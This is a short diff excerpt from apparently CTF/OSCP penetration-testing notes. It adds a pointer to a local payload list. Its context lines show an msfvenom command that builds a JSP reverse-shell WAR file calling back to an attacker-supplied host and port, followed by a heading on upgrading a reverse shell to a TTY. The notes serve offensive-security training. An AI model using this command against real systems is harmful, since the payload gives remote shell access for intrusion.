@@ -99,6 +99,7 @@ For CTF / OSCP, should not take you more than 30 mins to crack
     ```shell
     msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
     ```
+- payload types, see `/mnt/hgfs/kali-vm/msfvenom_payloads.txt`
 
 ## convert reverse shell to tty
 ```python
